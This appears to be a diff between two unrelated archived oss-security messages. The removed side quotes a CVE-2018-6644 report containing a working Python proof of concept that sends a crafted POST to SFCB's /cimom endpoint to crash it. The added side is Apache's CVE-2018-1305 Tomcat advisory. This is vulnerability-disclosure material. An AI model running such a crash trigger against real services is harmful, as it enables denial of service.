@@ -1,153 +1,58 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/02/09/2
-Message-ID: <20180209093444.vkebhw75m53ucd4n@suse.de>
-Date: Fri, 9 Feb 2018 10:34:44 +0100
-From: Marcus Meissner <meissner@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/02/23/1
+Message-ID: <0650ff91-3841-9773-14d9-58ba9b97698a@apache.org>
+Date: Fri, 23 Feb 2018 00:33:34 +0000
+From: Mark Thomas <markt@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: Re: Fw:Re: [scr459004] sfcb - 1.4.9
+Subject: Fwd: [SECURITY] CVE-2018-1305 Security constraint annotations applied too late
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+-------- Forwarded Message --------
+Subject: [SECURITY] CVE-2018-1305 Security constraint annotations
+applied too late
+Date: Fri, 23 Feb 2018 00:27:36 +0000
+From: Mark Thomas <markt@...che.org>
+Reply-To: announce@...cat.apache.org, announce@...cat.apache.org
+To: Tomcat Users List <users@...cat.apache.org>
+CC: Tomcat Developers List <dev@...cat.apache.org>, announce@...che.org,
+announce@...cat.apache.org <announce@...cat.apache.org>
 
-Patch from our sblim-sfcb maintainer Adam Majer to fix this issue is attached.
+CVE-2018-1305 Security constraint annotations applied too late
 
-Ciao, Marcus
+Severity: High
 
-On Wed, Feb 07, 2018 at 01:04:18PM +0800, XinleiHe wrote:
-> 
-> 
-> 
-> 
-> 
-> 
-> 
-> 
-> 
-> 
-> -------- Forwarding messages --------
-> From: cve-request@...re.org
-> Date: 2018-02-06 04:11:55
-> To:  hxl1999@...h.net
-> Cc:  cve-request@...re.org
-> Subject: Re: [scr459004] sfcb - 1.4.9
-> -----BEGIN PGP SIGNED MESSAGE-----
-> Hash: SHA256
-> 
-> The CVE ID is below. Please inform the software maintainer that the
-> CVE ID has been assigned.
-> 
-> 
-> > [Suggested description]
-> > SBLIM Small Footprint CIM Broker (SFCB) 1.4.9 has a
-> > null pointer (DoS) vulnerability via
-> > a crafted POST request to the /cimom URI.
-> > 
-> > ------------------------------------------
-> > 
-> > [Additional Information]
-> > You can use following python code to reproduce this vulnerability.
-> > 
-> > import httplib
-> > from xml.dom.minidom import Document
-> > class write_xml(Document):
-> >     def __init__(self):
-> > 
-> >         Document.__init__(self)
-> >  
-> >     def set_tag(self,tag):
-> >         self.tag = tag
-> >         self.cim = self.createElement(self.tag)
-> >         #self.setAttribute("encoding", "utf-8")
-> >         
-> >         self.cim.setAttribute("CIMVERSION", "2.0")
-> >         self.cim.setAttribute("DTDVERSION", "2.0")
-> >         self.appendChild(self.cim)
-> > 
-> >         self.msg = self.createElement("MESSAGE")
-> >         self.msg.setAttribute("ID", "4711")
-> >         self.msg.setAttribute("PROTOCOLVERSION","1.0")
-> >         self.cim.appendChild(self.msg)
-> > 
-> >         self.sim = self.createElement("SIMPLEREQ")
-> >         self.msg.appendChild(self.sim)
-> > 
-> >         self.ime = self.createElement("IMETHODCALL")
-> >         self.ime.setAttribute("NAME","EnumerateInstances")
-> >         self.sim.appendChild(self.ime)
-> > 
-> >         self.local = self.createElement("LOCALNAMESPACEPATH")
-> >         self.ime.appendChild(self.local)
-> >           
-> >         self.names1=self.createElement("NAMESPACE")
-> >         self.names1.setAttribute("NAME", "root")
-> >         self.local.appendChild(self.names1)
-> > 
-> >     def display(self):
-> >         print self.toprettyxml(indent="   ")
-> >     def retdata(self):
-> >         return self.toprettyxml(indent="   ")
-> > 
-> > def httpreq(data):
-> >  conn = httplib.HTTPConnection("127.0.0.1", 5988, False)
-> >  conn.request('POST', '/cimom',data)
-> >  res = conn.getresponse() 
-> > 
-> > def main(): 
-> >  wx = write_xml()
-> >  wx.set_tag('CIM')
-> >  print wx.retdata()
-> >  print httpreq(wx.retdata())
-> > 
-> > if __name__=='__main__':
-> >  main()
-> > 
-> > ------------------------------------------
-> > 
-> > [Vulnerability Type]
-> > Buffer Overflow
-> > 
-> > ------------------------------------------
-> > 
-> > [Vendor of Product]
-> > SBLIM project
-> > 
-> > ------------------------------------------
-> > 
-> > [Affected Product Code Base]
-> > sfcb - 1.4.9
-> > 
-> > ------------------------------------------
-> > 
-> > [Impact Denial of Service]
-> > true
-> 
-> Use CVE-2018-6644.
-> 
-> 
-> - -- 
-> CVE Assignment Team
-> M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-> [ A PGP key is available for encrypted communications at
->   http://cve.mitre.org/cve/request_id.html ]
-> -----BEGIN PGP SIGNATURE-----
-> Version: GnuPG v1
-> 
-> iQIcBAEBCAAGBQJaeLorAAoJEHb/MwWLVhi2xdoP/2OaKyQzIatRABkB35IlzYpR
-> vkjtDA8uXjMIcnuJr/sYa/zVFjIBRFQ2nLRkJs2d5Ni1uNsZ3hGm5A7Tn3RFsEby
-> tL6CvtY8h0MBf4xf6ZVdkzwshJyb05qaOB7UfUL5Fskzoxvs2QpcbGKGtbtaKbPU
-> YZq4t6aIyZW9UMEwheeCBDzGqC/oLVRUxgztgAy8SIhIlVfwtYEmHvafs11cN2XV
-> EjVvIbaOeRlOfelJvlSKCOjHj0vjOesouiGlMLm3nqYXm5en/T66tuCpaajn4zzO
-> I/Wj0Fm8tm2w0pkdfcNBewLu7+4bjRsiJ8U0SVPFQaOENvK7C3q6NyrfCgs1qesR
-> fr4LS9TfOcuuIjxn9w3T0Hr4nOAJnSwTiwmnuKoQblA/Pn/r8CquyKh/Rh/ST6P7
-> YxLUt9ZzXKf2SlWV1q+68N9RvefoXQFgQdAP2eUG0Y2i8ACZmxCPVLMclwUHvYIG
-> KFlei2bIp4IADt3zRdndQBzEK1NwFhNwIKSnE7ybRQqFx6yTgoEiOP0CpYZLmRqi
-> g94pvunSBKqPcCNhW/C78orO0Tz7UegnkaBMNYgIgW/jCFEiFGSBgi4VIjW8WWrr
-> M+BM/UGehRBbGjmRqphsOBHdc1H9VKUAWJ0Y4hzQAd5Y6QCcTWb0uMlbNMjINshR
-> 4TNbCFPf5EWJy7Bw8Gic
-> =q5wy
-> -----END PGP SIGNATURE-----
+Vendor: The Apache Software Foundation
 
--- 
-Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@...e.de>
+Versions Affected:
+Apache Tomcat 9.0.0.M1 to 9.0.4
+Apache Tomcat 8.5.0 to 8.5.27
+Apache Tomcat 8.0.0.RC1 to 8.0.49
+Apache Tomcat 7.0.0 to 7.0.84
 
-View attachment "set_default_content_type.patch" of type "text/x-patch" (2190 bytes)
+Description:
+Security constraints defined by annotations of Servlets were only
+applied once a Servlet had been loaded. Because security constraints
+defined in this way apply to the URL pattern and any URLs below that
+point, it was possible - depending on the order Servlets were loaded -
+for some security constraints not to be applied. This could have exposed
+resources to users who were not authorised to access them.
+
+Mitigation:
+Users of the affected versions should apply one of the following
+mitigations. Upgrade to:
+- Apache Tomcat 9.0.5 or later
+- Apache Tomcat 8.5.28 or later
+- Apache Tomcat 8.0.50 or later
+- Apache Tomcat 7.0.85 or later
+
+Credit:
+This issue was identified by the Apache Tomcat Security Team.
+
+History:
+2018-02-23 Original advisory
+
+References:
+[1] http://tomcat.apache.org/security-9.html
+[2] http://tomcat.apache.org/security-8.html
+[3] http://tomcat.apache.org/security-7.html
+
